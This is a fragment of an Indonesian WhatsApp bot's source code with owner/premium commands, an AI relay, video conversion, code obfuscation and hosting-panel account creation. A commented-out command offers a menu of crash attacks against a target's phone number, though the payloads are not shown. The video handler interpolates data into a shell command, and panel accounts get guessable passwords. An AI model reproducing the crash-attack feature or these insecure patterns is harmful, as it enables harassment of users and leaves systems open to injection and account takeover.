}}, { quoted: repf })
}
break

case "addowner":
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await ekuzika.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break

case "delowner":
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break

case 'setowner': {
if (!isOwner) return reply('kusus owner')
if (!text) return reply(`Contoh : ${prefix + command} 62×××`)
global.owner = text.split("|")[0]
 reply(`Exif berhasil diubah menjadi\n\n• No Owner : ${global.owner}`)
}
break

case 'self': {
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
ekuzika.public = false
reply('Succes Mode Private')
}
break

case "addprem":{
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ekuzika.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync(`./database/dtbs/premium.json`, JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break

case "delprem":{
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break

case 'public': {
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
ekuzika.public = true
reply('Succes Mode Public')
}
break

case "qc":
case "quickchat": {
if (!isOwner)return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
if (!quoted){
const getname = await ekuzika.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quoted.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
ekuzika.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
ekuzika.sendStimg(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} ebpcrash`)
}
}
break

case 'mangap': {
reply(`Makasi Kakak ${pushname} Atas Pujiannya`) 
}
break

case 'ai': {
	if (!text) return reply(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`);  
await ekuzika.sendMessage(m.chat, { react: { text: "❄",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://widipe.com/openai?text=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> ekuzika - AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./database/image/xbug.jpg')}, { upload: ekuzika.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
"buttonParamsJson": `{"display_text":"Nice ekuzika - AI","id":".mangap"}`
            }],
          }),
          contextInfo: {
  mentionedJid: [m.sender], 
  forwardingScore: 999,
  isForwarded: true,
forwardedNewsletterMessageInfo: {
  newsletterJid: '0@newsletter',
  newsletterName: namabot,
  serverMessageId: 143
}
}
       })
    }
  }
}, { quoted: m })
await ekuzika.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("Error Kak :(")
}
}
break

/*case 'ebpcrash': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
				let sections = [{
						title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐙͢𝐧ͯ𝐱𝐈͢𝐯ͮ𝐬 𝐗͢𝟏༑',
							id: `vip ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐗𝐳͢𝐞ͯ𝐭𝐬 𝐗͢𝟐༑',
							id: `andro ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐈𝐧ͮ͢𝐕𝐢𝐬ͯ͢𝐢𝐗 𝐗͢𝟕༑',
							id: `attack ${target}`
						}]
					},
					{
						title: '⌜ 𝐈𝚯𝐒 ⌟',
						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
							id: `xios ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
							id: `xip ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐓𝐫͢𝒂ͯ͢𝐯𝐚 𝐈𝐨ͮ͢𝐒༑',
							id: `iphone ${target}`
						}]
					},
					{
						title: '⌜ 𝐙𝐍𝐗 ⌟',
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐂͢𝐫𝐚ͯ𝐬͢𝐡𝐅𝐥͢𝐨ͮ𝐰༑',
							id: `crashflow ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰fน¢kฯ໐นͯͮ͢͢༑',
							id: `fuck ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰ͯ͢꯱ׁׅ֒tׁׅυׁׅƙׁׅ֑༑',
							id: `stuk ${target}`
						}]
					}]
let listMessage = {
    title: '𝐕𝐗𝚯 ❄ 𝐙𝐀𝚸', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "0@newsletter",
 newsletterName: 'Powered By JackTzy', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: ekuzika.decodeJid(ekuzika.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: (`\n🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠\n›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${target}`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ``
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: '',
 subtitle: "𝐙𝐲𝐧𝐓𝐳𝐲",
 hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/xbug.jpg")}, { upload: ekuzika.waUploadToServer })) 
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
},  {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://youtube.con/@ekuzikaxzoo\",\"merchant_url\":\"https://youtube.com/@ekuzikaxzoo\"}"
 },
 ]
 })
 })
 }
 }
}, {})

await ekuzika.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
*/
case 'hdvid' :
case 'hdvideo': 
case 'vidiohd':
case 'tohd': 
case 'vidhd' : {
//const { uptotelegra } = require('./database/upload');
const { exec } = require('child_process');
const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';
if (!mime) return m.reply(`Mana vidio nya bang?`);
reply(mess.wait);
const media = await quoted.download();
let meda = Buffer.from(media).toString("base64")
let input = "./input.mp4"
await fs.writeFileSync(input, meda)
let nnn = await fs.readFileSync(input)
const output = 'output.mp4'; // Nama file output
// Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
exec(`ffmpeg -i ${nnn} -vf "scale=854:480" -c:v libx264 -crf 23 -c:a copy ${output}`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);

  // Mengunggah video yang telah ditingkatkan resolusinya
  ekuzika.sendMessage(m.chat, { video: output, caption: `_Success To HD Video_` }, {quoted: m});
})
await sleep(2000)
fs.unlinkSync(output)
//fs.unlinkSync(media)
}
break

case 'enc': case 'encrypt': case 'obfuscate':
{
if (!q) return reply(`Contoh ${prefix+command} const time = require('money')`)
let meg = await obfus(q)
reply(`${meg.result}`)
}
break

case 'dec': case 'decrypt': case 'crack': {
await ekuzika.sendMessage(m.chat, { react: { text: "〽️", key: m.key } });
const { webcrack } = await import('webcrack');
const usage = `Contoh:
${command} (Input text or reply text to dec code)
${command} doc (Reply to a document)`;

// Pengecekan khusus owner
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)

let teext;
if (args.length >= 1) {
teext = args.join(" ");
} else if (m.quoted && m.quoted.text) {
teext = m.quoted.text;
} else {
return reply(usage);
}

try {
let messsage;
if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
let docBuffer;
if (m.quoted.mimetype) {
docBuffer = await m.quoted.download();
}
messsage = await webcrack(docBuffer.toString('utf-8'));
} else {
messsage = await webcrack(teext);
}

// Simpan hasil ke dalam file @Jackdecrypt.js
const filePath = './@Ebpdecrypt.js';
fs.writeFileSync(filePath, messsage.code);

// Kirim file @Jack.txt
await ekuzika.sendMessage(m.chat, {
document: {
url: filePath
},
mimetype: 'application/javascript',
fileName: 'Decrypt By Ebp.js'
}, {quoted: m});

} catch (error) {
const errorMessage = `Terjadi kesalahan: ${error.message}`;
await reply(errorMessage);
}
}
break

case '1gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "50"
let disk = "1024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await ekuzika.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ekuzika.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ekuzika(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '2gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "2024"
let cpu = "70"
let disk = "2024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await ekuzika.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ekuzika.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ekuzika(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '3gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "3024"
let cpu = "80"
let disk = "3024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await ekuzika.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ekuzika.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ekuzika(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '4gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "4024"
let cpu = "80"
let disk = "4024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await ekuzika.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ekuzika.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ekuzika(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '5gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "5024"
let cpu = "100"
let disk = "5024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await ekuzika.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ekuzika.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ekuzika(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '6gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "6024"
let cpu = "160"
let disk = "6024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await ekuzika.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ekuzika.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
